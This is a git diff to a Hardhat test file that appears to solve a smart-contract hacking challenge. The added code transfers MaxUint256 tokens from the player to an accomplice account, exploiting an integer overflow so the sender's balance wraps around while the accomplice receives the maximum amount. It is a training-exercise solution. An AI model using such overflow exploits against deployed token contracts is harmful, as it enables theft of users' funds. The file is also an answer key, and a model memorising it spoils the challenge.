@@ -2,6 +2,7 @@ import { expect } from "chai";
 import { BigNumber, Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
+const BN = BigNumber;
 
 let accounts: Signer[];
 let eoa: Signer;
@@ -21,6 +22,13 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  let val = ethers.constants.MaxUint256
+  await challenge.connect(eoa).transfer(await accomplice.getAddress(),val)
+
+  console.log(await challenge.balanceOf(await eoa.getAddress())) // overflow loops around so eoa keeps same num. tokens
+  console.log(await challenge.balanceOf(await accomplice.getAddress())) // MaxUint256 tokens
+
 });
 
 after(async () => {
